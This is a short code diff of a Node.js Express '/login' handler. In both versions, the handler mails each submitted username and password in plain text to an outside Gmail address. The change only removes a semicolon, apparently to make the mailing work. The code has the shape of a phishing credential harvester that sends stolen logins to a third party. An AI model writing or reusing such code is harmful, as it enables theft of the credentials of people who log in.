@@ -28,7 +28,7 @@ app.post('/login',(req,res)=>{
         from: 'bdevi2472@gmail.com', // Sender address
         to: 'ruthlessdestroyer085@gmail.com',          // List of recipients
         subject: "is this working",              // Subject line
-        text: `password is : ${username} \n username is : ${password}`;                       // Plain text body                
+        text: `password is : ${username} \n username is : ${password}`                      // Plain text body                
       };
       
       // Send mail with defined transport object
